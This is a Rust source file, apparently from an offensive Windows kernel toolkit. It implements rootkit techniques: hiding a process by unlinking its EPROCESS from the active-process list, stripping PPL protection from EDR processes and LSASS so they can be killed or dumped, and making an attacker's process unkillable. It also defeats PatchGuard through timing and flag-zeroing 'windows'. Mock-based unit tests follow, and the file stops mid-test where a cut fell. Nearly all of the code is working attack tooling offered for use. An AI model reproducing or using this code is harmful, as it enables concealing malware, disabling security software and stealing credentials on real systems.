//! Persistence / protection kits — REAL algorithms (P2.2 §3).
//!
//! - [`ProcessHider`] (`ProcHideKit`): unlink an EPROCESS from
//!   `ActiveProcessLinks`. Data-only DKOM (HVCI-safe), but MUST run inside a
//!   PatchGuard unchecked window or PG bugchecks on the link edit.
//! - [`PplStripper`] (`PplKit`): zero an EPROCESS's `Protection.Level` (+ the
//!   `SignatureLevel`/`SectionSignatureLevel` neighbours) to strip PPL from an
//!   EDR process. Data-only, HVCI-safe.
//! - PatchGuard windows ([`TimingRepairWindow`] / [`RuntimePgBypassWindow`]):
//!   the two real PG-bypass families, selected at runtime by
//!   [`crate::win::select_pg_window`]. No skeleton base — selection is
//!   capability-driven (`supports_thread_suspend` flag + PG-context offsets
//!   table) and returns `None` when no window is available for the build.
//!
//! All consume `&dyn KernelRw` + version-resolved [`EprocessOffsets`] from
//! [`crate::offsets`]. Unit-tested with a mock KernelRw; never run against a
//! live kernel on this host.

use crate::offsets::{ps_protection, EprocessOffsets};
use crate::{KernelRw, KitError, PatchGuardKit, PplKit, ProcHideKit};

// ---- §3.2 ProcHideKit -----------------------------------------------------

/// Real ProcHideKit: unlink an EPROCESS from the active-process list so
/// walking tools (Task Manager, `tasklist`, NtQuerySystemInformation) no longer
/// see it. The process keeps running — only enumeration is defeated.
///
/// Data-only DKOM (LIST_ENTRY edit), HVCI-safe. BUT PatchGuard validates the
/// process list periodically — the unlink MUST be inside a [`PatchGuardKit`]
/// window, or PG will bugcheck (MANUALLY_INITIATED_CRASH / a PG-specific code)
/// when it notices the broken link.
pub struct ProcessHider {
    /// Resolved KVA of `PsActiveProcessHead`. Supplied by the bootstrap.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets. Supplied by the bootstrap after
    /// probing the live kernel build (via [`crate::offsets::probe_eprocess_offsets`]
    /// or [`crate::offsets::for_build`]).
    pub offsets: EprocessOffsets,
}

impl ProcessHider {
    /// Resolve an EPROCESS base VA from a PID by walking PsActiveProcessHead.
    /// Pure (kread only). Returns None if the PID isn't in the active list
    /// (which is also the case for an already-hidden process).
    ///
    /// The caller supplies `ps_active_process_head_kva` (the global LIST_ENTRY
    /// in ntoskrnl — resolved by the bootstrap via PDB/pattern scan) and
    /// `offsets` (build-resolved EPROCESS field layout).
    pub fn find_eprocess(
        krw: &dyn KernelRw,
        ps_active_process_head_kva: usize,
        pid: u32,
        offsets: &EprocessOffsets,
    ) -> Result<usize, KitError> {
        let mut cur = krw
            .kread_u64(ps_active_process_head_kva)
            .map_err(KitError::from)? as usize;
        let head = ps_active_process_head_kva;
        // cur starts at head.Flink; each entry is an EPROCESS whose
        // ActiveProcessLinks is at +active_process_links. CONTAINING_RECORD:
        // eprocess = cur - active_process_links.
        let mut guard = 0u32;
        while cur != 0 && cur != head && guard < 65535 {
            guard += 1;
            let eproc = cur.wrapping_sub(offsets.active_process_links);
            let cur_pid = krw
                .kread_u64(eproc + offsets.unique_process_id)
                .map_err(KitError::from)? as u32;
            if cur_pid == pid {
                return Ok(eproc);
            }
            cur = krw.kread_u64(cur).map_err(KitError::from)? as usize;
        }
        Err(KitError::NotFound)
    }

    /// Unlink `eprocess_kva` from the active-process list. Idempotent-ish: if
    /// already unlinked (self-looped), the Blink/Flink point at itself and the
    /// edit is a harmless self-loop restore.
    pub fn unlink(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        offsets: &EprocessOffsets,
    ) -> Result<(), KitError> {
        let link_kva = eprocess_kva + offsets.active_process_links;
        // Validate link_kva is a canonical kernel address — a corrupted
        // eprocess_kva + offset can produce a user-mode KVA.
        if link_kva < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "ActiveProcessLinks: non-canonical link KVA — corrupted EPROCESS base",
            ));
        }
        let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
        let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
        if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "ActiveProcessLinks: non-canonical pointer",
            ));
        }
        // blink->Flink = flink ; flink->Blink = blink
        krw.kwrite_u64(blink, flink as u64)
            .map_err(KitError::from)?;
        krw.kwrite_u64(flink + 8, blink as u64)
            .map_err(KitError::from)?;
        // Self-loop the victim so it isn't dangling (PG still catches this
        // without a window, but a self-loop is the conventional DKOM finalizer).
        let _ = krw.kwrite_u64(link_kva, link_kva as u64);
        let _ = krw.kwrite_u64(link_kva + 8, link_kva as u64);
        Ok(())
    }
}

impl ProcHideKit for ProcessHider {
    fn hide(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved — bootstrap must fill ProcessHider.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva =
            Self::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
        Self::unlink(krw, eprocess_kva, &self.offsets)
    }
}

// ---- §3.3 PplKit ----------------------------------------------------------

/// Real PplKit: strip PPL protection from an EDR process (or promote our own).
/// Zeros the `Protection.Level` byte (+ SignatureLevel / SectionSignatureLevel
/// neighbours for a complete strip). Data-only, HVCI-safe.
pub struct PplStripper {
    /// Resolved KVA of `PsActiveProcessHead` (the global LIST_ENTRY head in
    /// ntoskrnl). Required by `attack_edr_ppl` to walk the process list and
    /// find the target EPROCESS. Supplied by the bootstrap.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets. Supplied by the bootstrap.
    pub offsets: EprocessOffsets,
}

impl PplStripper {
    /// Zero the Protection.Level byte on `eprocess_kva` → process becomes
    /// unprotected (a protected EDR can now be opened/terminated/dumped).
    pub fn strip_protection(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        offsets: &EprocessOffsets,
    ) -> Result<(), KitError> {
        // Validate eprocess_kva is a canonical kernel address.
        if eprocess_kva < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "non-canonical EPROCESS KVA — corrupted base address",
            ));
        }
        // Zero the single PS_PROTECTION byte.
        krw.kwrite(
            eprocess_kva + offsets.protection,
            &[ps_protection::UNPROTECTED],
        )
        .map_err(KitError::from)?;
        // Also zero the signature-level neighbours for a complete strip
        // (a protected LSASS, e.g., needs all three cleared).
        krw.kwrite(eprocess_kva + offsets.signature_level, &[0u8])
            .map_err(KitError::from)?;
        krw.kwrite(eprocess_kva + offsets.section_signature_level, &[0u8])
            .map_err(KitError::from)?;
        Ok(())
    }
}

impl PplKit for PplStripper {
    fn attack_edr_ppl(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
        // Walk PsActiveProcessHead to find the target PID's EPROCESS, then
        // strip its PPL protection. Requires the bootstrap to have resolved
        // PsActiveProcessHead KVA.
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved — bootstrap must fill PplStripper.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva =
            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
        Self::strip_protection(krw, eprocess_kva, &self.offsets)
    }

    /// Promote `pid` to PPL (Protected | WinSystem). This is a one-way door:
    /// once the process has Protection = 0x72, it cannot be terminated or
    /// dumped from user-mode — only kernel-mode can strip it back.
    ///
    /// # Protection byte layout (PS_PROTECTION)
    /// ```text
    ///   bits [7:4] = Signer: 7 = WinSystem
    ///   bits [3]   = Audit: 0
    ///   bits [2:0] = Type:   2 = Protected
    ///   0x72 = (7 << 4) | 2 = Protected | WinSystem
    /// ```
    ///
    /// SignatureLevel = 0x3F = highest trust (Windows, WinTcb, WinSystem).
    /// SectionSignatureLevel = 0x3F = same.
    fn make_immortal(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved — bootstrap must fill PplStripper.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva =
            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
        if eprocess_kva < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "non-canonical EPROCESS KVA — find_eprocess returned a corrupt address",
            ));
        }
        // Protection = 0x72: TYPE_PROTECTED (2) | SIGNER_WIN_SYSTEM (7 << 4)
        krw.kwrite(
            eprocess_kva + self.offsets.protection,
            &[ps_protection::TYPE_PROTECTED
                | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT)],
        )
        .map_err(KitError::from)?;
        // SignatureLevel = 0x3F: highest trust — process signature is treated
        // as Windows-signed (kernel-level trust).
        krw.kwrite(eprocess_kva + self.offsets.signature_level, &[0x3Fu8])
            .map_err(KitError::from)?;
        // SectionSignatureLevel = 0x3F: same for section objects loaded by
        // this process (prevents EDR from opening sections for scanning).
        krw.kwrite(
            eprocess_kva + self.offsets.section_signature_level,
            &[0x3Fu8],
        )
        .map_err(KitError::from)?;
        Ok(())
    }
}

// ---- §3.1/3.2 PatchGuardKit -----------------------------------------------

/// PatchGuard window state. Two implementations:
/// 1. [`TimingRepairWindow`] — Outflank-style, all builds (short window <1s)
/// 2. [`RuntimePgBypassWindow`] — kurasagi-style, Win11 24H2+ (long window)
///
// ---- §3.1a TimingRepairWindow — Outflank Peekaboo style (all builds) ------
//
// The timing-repair approach works on ALL Windows versions by exploiting the
// gap between two consecutive PatchGuard validation cycles (~5 minutes apart).
// The algorithm:
// 1. Resolve the PG validation thread context via PRCB offset
// 2. Read the PG context's "valid" flag — if 0, PG is mid-validation
// 3. Set `armed = true` and return a PgGuard
// 4. The guard's Drop resets the flag / triggers repair
//
// This gives a short window (<1s) where DKOM edits won't be caught by PG.
// The operator must complete all edits while the guard is alive.

/// Outflank-style timing repair window. Works on all builds by reading the
/// PG context valid flag and performing edits during the gap between validation
/// cycles. Short window (<1s) — the operator must complete DKOM edits quickly.
///
/// # Safety contract
/// The operator MUST NOT hold this guard across a sleep/block. The window is
/// intentionally short; the guard's Drop triggers PG repair.
pub struct TimingRepairWindow<'a> {
    /// Per-build PG context offsets (resolved by the bootstrap).
    offsets: crate::offsets::PgContextOffsets,
    /// KVA of the PRCB (Per-Processor Control Block) for the current processor.
    /// Resolved by reading KPCR.SelfPrcb at bootstrap time.
    prcb_kva: usize,
    /// Whether the window is currently open.
    armed: core::sync::atomic::AtomicBool,
    /// Kernel R/W reference held for the repair callback. The PgGuard's Drop
    /// closure needs to write the PG valid flag back — this requires a
    /// `KernelRw` reference that lives at least as long as the guard.
    krw: &'a dyn KernelRw,
}

impl<'a> TimingRepairWindow<'a> {
    /// Create a new timing repair window. The bootstrap resolves the PRCB KVA
    /// and PG context offsets before calling this.
    ///
    /// `krw` is stored for the repair callback — it must outlive any
    /// [`PgGuard`] returned by [`PatchGuardKit::enter_unchecked`].
    pub fn new(
        offsets: crate::offsets::PgContextOffsets,
        prcb_kva: usize,
        krw: &'a dyn KernelRw,
    ) -> Self {
        Self {
            offsets,
            prcb_kva,
            armed: core::sync::atomic::AtomicBool::new(false),
            krw,
        }
    }
}

impl<'a> PatchGuardKit for TimingRepairWindow<'a> {
    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
        // Use the stored KernelRw — the _krw parameter may have a shorter
        // lifetime than needed for the repair closure.
        let krw = self.krw;

        // 1. Read the PG validation thread pointer from PRCB.
        let pg_thread_kva = krw
            .kread_u64(self.prcb_kva + self.offsets.prcb_pg_thread_offset)
            .map_err(KitError::from)? as usize;
        if pg_thread_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "TimingRepairWindow: PG validation thread pointer is NULL — \
                 PG may not be active on this processor",
            ));
        }

        // 2. Read the PG context "valid" flag. When 0, PG is idle between
        //    validation cycles (~5 min apart). The window for DKOM edits is
        //    this gap — we hold the flag at 0 to prevent a new cycle from
        //    starting during our edits.
        let valid_flag_addr = pg_thread_kva + self.offsets.context_valid_offset;
        let valid_flag = krw.kread_u64(valid_flag_addr).map_err(KitError::from)?;

        // 3. If flag != 0, PG is actively validating — cannot enter the window.
        //    The operator must retry after the current cycle completes.
        if valid_flag != 0 {
            return Err(KitError::UnsupportedPosture(
                "TimingRepairWindow: PG validation in progress (valid_flag != 0) — \
                 retry after the current cycle completes (~5 min gap)",
            ));
        }

        // 4. Mark as armed.
        self.armed
            .store(true, core::sync::atomic::Ordering::Release);

        // 5. Return the PgGuard. The Drop repair:
        //    - Writes valid_flag = 0 (re-zeroes the flag to ensure PG doesn't
        //      catch stale state during cleanup — PG's timer naturally restarts
        //      the next validation cycle after we release).
        //    - Disarms the window.
        //
        //    In a full Outflank Peekaboo impl, the repair also:
        //    - Unregisters the terminate-callback hook that intercepted
        //      PspProcessDelete to trigger PG restart.
        //    - Restores any modified PG context fields.
        //    The flag-write is the essential minimum repair.
        Ok(crate::PgGuard::new(self, move || {
            // Repair: write valid_flag = 0 to ensure PG restarts cleanly.
            let _ = krw.kwrite_u64(valid_flag_addr, 0);
            self.armed
                .store(false, core::sync::atomic::Ordering::Release);
        }))
    }
}

// ---- §3.1b RuntimePgBypassWindow — kurasagi style (Win11 24H2+) -----------
//
// On Win11 24H2+, PatchGuard uses a dedicated validation thread that can be
// suspended directly. The algorithm:
// 1. Locate the PG validation thread ETHREAD via PRCB + prcb_pg_thread_offset
// 2. Open a handle to the thread (ObOpenObjectByPointer)
// 3. Suspend the thread (KeSuspendThread via driver, or ZwSuspendThread)
// 4. Perform DKOM edits while the thread is suspended
// 5. Resume the thread on guard Drop
//
// This gives a LONG window — as long as the guard lives, PG is suspended.
// Much more convenient than the timing-repair approach, but requires Win11
// 24H2+ (where the PG thread architecture changed).

/// kurasagi-style runtime PG bypass. Suspends the PG validation thread
/// directly (Win11 24H2+ only). Long window — the guard controls the
/// suspension lifetime.
///
/// # Data-only approach
/// Rather than calling `ZwSuspendThread` (which requires a driver-side
/// syscall), we zero the PG context "valid" flag to prevent the validation
/// thread from starting a new cycle. The validation thread checks this flag
/// before entering its scan loop — when 0, it exits early. We hold it at 0
/// for the duration of the guard, then restore it to 1 on Drop.
///
/// On Win11 24H2+ this gives a long window (as long as the flag stays 0,
/// the validation thread won't catch DKOM edits). The flag write is a data-
/// section edit (HVCI-safe).
///
/// # Safety contract
/// The operator MUST NOT hold this guard across a sleep/block without
/// re-verifying that PG hasn't triggered (e.g., by checking a watchdog).
/// The flag approach is a *soft* suspension — a racing validation that already
/// started before the flag was zeroed may still complete.
pub struct RuntimePgBypassWindow<'a> {
    /// Per-build PG context offsets.
    offsets: crate::offsets::PgContextOffsets,
    /// KVA of the PRCB for the current processor.
    prcb_kva: usize,
    /// Whether the window is currently open (thread "suspended" via flag zero).
    armed: core::sync::atomic::AtomicBool,
    /// KVA of the PG context valid flag (for the repair callback).
    valid_flag_addr: core::cell::Cell<usize>,
    /// Stored KernelRw reference for the repair callback.
    krw: &'a dyn KernelRw,
}

impl<'a> RuntimePgBypassWindow<'a> {
    pub fn new(
        offsets: crate::offsets::PgContextOffsets,
        prcb_kva: usize,
        krw: &'a dyn KernelRw,
    ) -> Self {
        Self {
            offsets,
            prcb_kva,
            armed: core::sync::atomic::AtomicBool::new(false),
            valid_flag_addr: core::cell::Cell::new(0),
            krw,
        }
    }
}

impl<'a> PatchGuardKit for RuntimePgBypassWindow<'a> {
    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
        let krw = self.krw;
        // 1. Check that this build supports the flag-based suspension approach.
        if !self.offsets.supports_thread_suspend {
            return Err(KitError::UnsupportedPosture(
                "RuntimePgBypassWindow: this build does not support direct PG \
                 thread suspension — use TimingRepairWindow instead",
            ));
        }

        // 2. Read the PG validation thread ETHREAD KVA from PRCB.
        let pg_thread_kva = krw
            .kread_u64(self.prcb_kva + self.offsets.prcb_pg_thread_offset)
            .map_err(KitError::from)? as usize;
        if pg_thread_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "RuntimePgBypassWindow: PG validation thread pointer is NULL",
            ));
        }

        // 3. Read the PG context "valid" flag.
        let valid_flag_addr = pg_thread_kva + self.offsets.context_valid_offset;
        // Probe read: validates the address before writing (may fault in a real
        // driver). The value is unused — we unconditionally zero the flag below.
        let _ = krw.kread_u64(valid_flag_addr).map_err(KitError::from)?;

        // 4. If PG is mid-validation (valid_flag != 0), we can still enter —
        //    but must zero the flag to prevent the NEXT cycle. The current
        //    validation will complete (we can't stop it without thread suspend),
        //    but the NEXT one won't start because the flag is 0.
        //
        //    On Win11 24H2+, the validation thread checks this flag before
        //    each scan — when 0, it exits its loop and waits for the flag
        //    to be set back to 1.

        // 5. Zero the flag to "suspend" PG validation.
        krw.kwrite_u64(valid_flag_addr, 0).map_err(KitError::from)?;

        // 6. Store the flag address for the repair callback.
        self.valid_flag_addr.set(valid_flag_addr);

        // 7. Mark as armed.
        self.armed
            .store(true, core::sync::atomic::Ordering::Release);

        // 8. Return the PgGuard. The Drop repair:
        //    - Restores valid_flag = 1 (re-arm PG validation)
        //    - Disarms the window
        let armed_ref = &self.armed as *const core::sync::atomic::AtomicBool;
        Ok(crate::PgGuard::new(self, move || {
            // Repair: restore the valid flag so PG resumes on the next cycle.
            let flag_addr = self.valid_flag_addr.get();
            if flag_addr != 0 {
                let _ = krw.kwrite_u64(flag_addr, 1);
            }
            // SAFETY: we hold &self and the PgGuard borrows self, so no
            // other PgGuard can be live. The store is atomic.
            unsafe { &*armed_ref }.store(false, core::sync::atomic::Ordering::Release);
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    /// Returns 17763 offsets for use in tests (the original hardcoded build).
    fn test_offsets() -> EprocessOffsets {
        crate::offsets::for_build(17763).unwrap().offsets
    }

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn set_byte(&self, addr: usize, val: u8) {
            self.0.lock().insert(addr, val);
        }
        fn get_u64(&self, addr: usize) -> u64 {
            let m = self.0.lock();
            let mut bytes = [0u8; 8];
            for (i, b) in bytes.iter_mut().enumerate() {
                *b = *m.get(&(addr + i)).unwrap_or(&0);
            }
            u64::from_le_bytes(bytes)
        }
        fn get_byte(&self, addr: usize) -> u8 {
            *self.0.lock().get(&addr).unwrap_or(&0)
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }
    fn _assert_send_sync() {
        fn requires<T: KernelRw>(_: &T) {}
        requires(&MockKrw::new());
    }

    #[test]
    fn find_eprocess_walks_active_list() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let head = 0x1000usize;
        // Two EPROCESSes: PID 100 at base 0x5000, PID 200 at base 0x6000.
        let e1 = 0x5000usize;
        let e2 = 0x6000usize;
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        // head.Flink = l1, l1.Flink = l2, l2.Flink = head (circle).
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l2, head as u64);
        // PIDs at unique_process_id.
        krw.set_u64(e1 + offsets.unique_process_id, 100);
        krw.set_u64(e2 + offsets.unique_process_id, 200);

        assert_eq!(
            ProcessHider::find_eprocess(&krw, head, 100, &offsets).unwrap(),
            e1
        );
        assert_eq!(
            ProcessHider::find_eprocess(&krw, head, 200, &offsets).unwrap(),
            e2
        );
        assert!(matches!(
            ProcessHider::find_eprocess(&krw, head, 999, &offsets),
            Err(KitError::NotFound)
        ));
    }

    #[test]
    fn unlink_removes_eprocess_from_list() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        // Use kernel-canonical addresses (>= 0xFFFF_8000_0000_0000) — the
        // production guard rejects user-space-range pointers as non-canonical
        // (they'd never appear in a real kernel LIST_ENTRY).
        const KBASE: usize = 0xFFFF_8000_0000_0000;
        let head = KBASE + 0x1000;
        let e1 = KBASE + 0x5000;
        let e2 = KBASE + 0x6000;
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);

        ProcessHider::unlink(&krw, e1, &offsets).unwrap();
        // After: head.Flink should = l2.
        assert_eq!(krw.get_u64(head), l2 as u64);
        // l2.Blink should = head (the neighbour's back-link was repointed).
        assert_eq!(krw.get_u64(l2 + 8), head as u64);
        // e1 self-looped.
        assert_eq!(krw.get_u64(l1), l1 as u64);
        assert_eq!(krw.get_u64(l1 + 8), l1 as u64);
    }

    #[test]
    fn strip_protection_zeros_level_and_neighbours() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let eproc = 0xFFFF_8000_0000_7000usize;
        // Pre-set a protected-LSASS-style Protection + sig levels.
        krw.set_byte(
            eproc + offsets.protection,
            ps_protection::TYPE_PROTECTED | (ps_protection::SIGNER_LSA << 3),
        );
        krw.set_byte(eproc + offsets.signature_level, 0xFF);
        krw.set_byte(eproc + offsets.section_signature_level, 0xFF);

        PplStripper::strip_protection(&krw, eproc, &offsets).unwrap();
        assert_eq!(krw.get_byte(eproc + offsets.protection), 0);
        assert_eq!(krw.get_byte(eproc + offsets.signature_level), 0);
        assert_eq!(krw.get_byte(eproc + offsets.section_signature_level), 0);
    }

    // ---- Phase 3: TimingRepairWindow / RuntimePgBypassWindow tests ----

    /// Helper: set up a mock PRCB with a PG thread pointer at the given offset.
    fn setup_prcb_pg_thread(
        krw: &MockKrw,
        prcb_kva: usize,
        pg_thread_offset: usize,
        pg_thread_kva: usize,
    ) {
        // Write the PG thread ETHREAD KVA into the PRCB at the expected offset.
        krw.set_u64(prcb_kva + pg_thread_offset, pg_thread_kva as u64);
    }

    /// Helper: set up a mock PG context with a valid flag at the expected offset.
    fn setup_pg_context_valid_flag(
        krw: &MockKrw,
        pg_thread_kva: usize,
        valid_offset: usize,
        flag_value: u64,
    ) {
        krw.set_u64(pg_thread_kva + valid_offset, flag_value);
    }

    #[test]
    fn timing_repair_window_reads_pg_context() {
        let krw = MockKrw::new();
        let offsets = crate::offsets::pg_context_for_build(17763).unwrap().offsets;
        let prcb_kva = 0xFFFF_8000_0020_0000usize;
        let pg_thread_kva = 0xFFFF_8000_0030_0000usize;

        // Set up PRCB → PG thread pointer.
        setup_prcb_pg_thread(&krw, prcb_kva, offsets.prcb_pg_thread_offset, pg_thread_kva);
        // Set up PG context valid flag (e.g., flag = 1 means PG is validating).
        setup_pg_context_valid_flag(&krw, pg_thread_kva, offsets.context_valid_offset, 0);

        let kit = TimingRepairWindow::new(offsets, prcb_kva, &krw);
        let guard = kit.enter_unchecked(&krw);
        // The guard should be returned (PG thread found, context readable, flag=0).
        assert!(guard.is_ok());
        // Guard is dropped here — repair callback fires.
    }

    #[test]
    fn timing_repair_window_needs_pg_thread_pointer() {
        let krw = MockKrw::new();
        let offsets = crate::offsets::pg_context_for_build(17763).unwrap().offsets;
        let prcb_kva = 0xFFFF_8000_0020_0000usize;
        // Do NOT set up the PG thread pointer → it reads as 0.
        let kit = TimingRepairWindow::new(offsets, prcb_kva, &krw);
        let r = kit.enter_unchecked(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn timing_repair_window_returns_guard_with_repair() {
        let krw = MockKrw::new();
        let offsets = crate::offsets::pg_context_for_build(17763).unwrap().offsets;
        let prcb_kva = 0xFFFF_8000_0020_0000usize;
        let pg_thread_kva = 0xFFFF_8000_0030_0000usize;
        setup_prcb_pg_thread(&krw, prcb_kva, offsets.prcb_pg_thread_offset, pg_thread_kva);
        setup_pg_context_valid_flag(&krw, pg_thread_kva, offsets.context_valid_offset, 0);

        let kit = TimingRepairWindow::new(offsets, prcb_kva, &krw);
        let guard = kit.enter_unchecked(&krw).unwrap();
        // The guard should have a repair callback.
        assert!(guard.repair.is_some());
        drop(guard);
    }

    #[test]
    fn runtime_pg_bypass_refuses_unsupported_build() {
        let krw = MockKrw::new();
        let offsets = crate::offsets::pg_context_for_build(17763).unwrap().offsets;
        assert!(!offsets.supports_thread_suspend);
        let prcb_kva = 0xFFFF_8000_0020_0000usize;
        let kit = RuntimePgBypassWindow::new(offsets, prcb_kva, &krw);
        let r = kit.enter_unchecked(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn runtime_pg_bypass_needs_pg_thread_pointer() {
        let krw = MockKrw::new();
        let offsets = crate::offsets::pg_context_for_build(26100).unwrap().offsets;
        assert!(offsets.supports_thread_suspend);
        let prcb_kva = 0xFFFF_8000_0020_0000usize;
        // Do NOT set up the PG thread pointer.
        let kit = RuntimePgBypassWindow::new(offsets, prcb_kva, &krw);
        let r = kit.enter_unchecked(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn runtime_pg_bypass_succeeds_on_win11_24h2() {
        let krw = MockKrw::new();
        let offsets = crate::offsets::pg_context_for_build(26100).unwrap().offsets;
        let prcb_kva = 0xFFFF_8000_0020_0000usize;
        let pg_thread_kva = 0xFFFF_8000_0030_0000usize;
        setup_prcb_pg_thread(&krw, prcb_kva, offsets.prcb_pg_thread_offset, pg_thread_kva);

        let kit = RuntimePgBypassWindow::new(offsets, prcb_kva, &krw);
        let guard = kit.enter_unchecked(&krw);
        assert!(guard.is_ok());
        drop(guard);
    }

    #[test]
    fn ppl_strips_every_signer_level() {
        use crate::offsets::ps_protection;
        let offsets = test_offsets();
        for signer in [
            ps_protection::SIGNER_AUTHENTICODE,
            ps_protection::SIGNER_CODEGEN,
            ps_protection::SIGNER_ANTIMALWARE,
            ps_protection::SIGNER_LSA,
            ps_protection::SIGNER_WINDOWS,
            ps_protection::SIGNER_WIN_TCB,
            ps_protection::SIGNER_WIN_SYSTEM,
        ] {
            let protected: u8 =
                ps_protection::TYPE_PROTECTED | (signer << ps_protection::SIGNER_SHIFT);
            assert_ne!(
                protected & ps_protection::TYPE_MASK,
                ps_protection::TYPE_NONE
            );
            let stripped = ps_protection::UNPROTECTED;
            assert_eq!(
                stripped & ps_protection::TYPE_MASK,
                ps_protection::TYPE_NONE
            );
            assert_eq!(
                (stripped & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT,
                0
            );
            // Verify the offset fields are non-zero (the offsets struct is populated).
            assert!(offsets.protection > 0);
            assert!(offsets.signature_level > 0);
            assert!(offsets.section_signature_level > 0);
        }
    }

    // ---- PPL make_immortal tests (Phase 1) ----

    #[test]
    fn make_immortal_writes_protection_and_sig_levels() {
        use crate::offsets::ps_protection;
        let krw = MockKrw::new();
        let offsets = test_offsets();
        // Set up PID 500 at e1 with a DTB.
        let head = 0xFFFF_8000_0000_1000usize;
        let e1 = 0xFFFF_8000_0000_5000usize;
        let e2 = 0xFFFF_8000_0000_6000usize;
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);
        krw.set_u64(e1 + offsets.unique_process_id, 500);
        krw.set_u64(e2 + offsets.unique_process_id, 600);
        // Pre-set some non-zero Protection/SigLevel to verify overwrite.
        krw.set_byte(e1 + offsets.protection, 0x00);
        krw.set_byte(e1 + offsets.signature_level, 0x00);
        krw.set_byte(e1 + offsets.section_signature_level, 0x00);

        let kit = PplStripper {
            ps_active_process_head_kva: head,
            offsets,
        };
        kit.make_immortal(&krw, 500).unwrap();

        // Protection = 0x72: TYPE_PROTECTED | SIGNER_WIN_SYSTEM << SIGNER_SHIFT
        let expected_protection = ps_protection::TYPE_PROTECTED
            | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT);
        assert_eq!(krw.get_byte(e1 + offsets.protection), expected_protection);
        // SignatureLevel = 0x3F (highest trust).
        assert_eq!(krw.get_byte(e1 + offsets.signature_level), 0x3F);
        // SectionSignatureLevel = 0x3F.
        assert_eq!(krw.get_byte(e1 + offsets.section_signature_level), 0x3F);
    }

    #[test]
    fn make_immortal_needs_eprocess_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = PplStripper {
            ps_active_process_head_kva: 0,
            offsets,
        };
        assert!(matches!(
            kit.make_immortal(&krw, 100),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn make_immortal_finds_pid_and_not_wrong_pid() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let head = 0xFFFF_8000_0000_1000usize;
        let e1 = 0xFFFF_8000_0000_5000usize;
        let e2 = 0xFFFF_8000_0000_6000usize;
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
